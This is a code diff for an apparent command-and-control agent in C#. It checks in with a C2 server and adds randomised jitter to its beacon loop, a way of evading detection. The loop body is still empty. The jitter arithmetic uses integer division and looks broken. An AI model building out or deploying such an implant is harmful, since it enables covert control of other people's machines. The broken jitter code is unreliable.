@@ -10,6 +10,7 @@ using System.Text.Json;
 
 AgentInformationService agentInformationService = new AgentInformationService();
 
+// Queues, random and agentInfo 
 var taskQueue = new ConcurrentQueue<AgentTask>();
 var taskQueueLock = new object();
 var messageQueue = new ConcurrentQueue<AgentTask>();
@@ -40,32 +41,33 @@ var request = new C2Request
 };
 
 // Init contact request
-var communicationService = new CommunicationService(baseConfig);
-var registrationResult = await communicationService.SimplePostAsync("checkin", JsonSerializer.Serialize(request));
+var baseCommunicationService = new CommunicationService(baseConfig);
+var registrationResult = await baseCommunicationService.SimplePostAsync("checkin", JsonSerializer.Serialize(request));
 
 if (registrationResult is null)
 {
     Console.WriteLine("Failed to register with the C2 server.");
     Environment.Exit(1);
 }
-try
+// Main loop
+while (true)
 {
-    // Main loop
-    while (true)
+    try
     {
         using (var client = new HttpClient())
         {
 
         }
 
-        await Task.Delay(baseConfig.Sleep * 1000); // TODO : Implement jitter
+        int realJitter = delay * (jitter / 100);
+        if (rnd.Next(2) == 0) { realJitter = -realJitter; }
+        Thread.Sleep((delay + realJitter) * 1000);
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"Agent initialization failed: {ex.Message}");
     }
 }
-catch (Exception ex)
-{
-    Console.WriteLine($"Agent initialization failed: {ex.Message}");
-}
-
 
 async Task HandleQueuedTasks()
 {
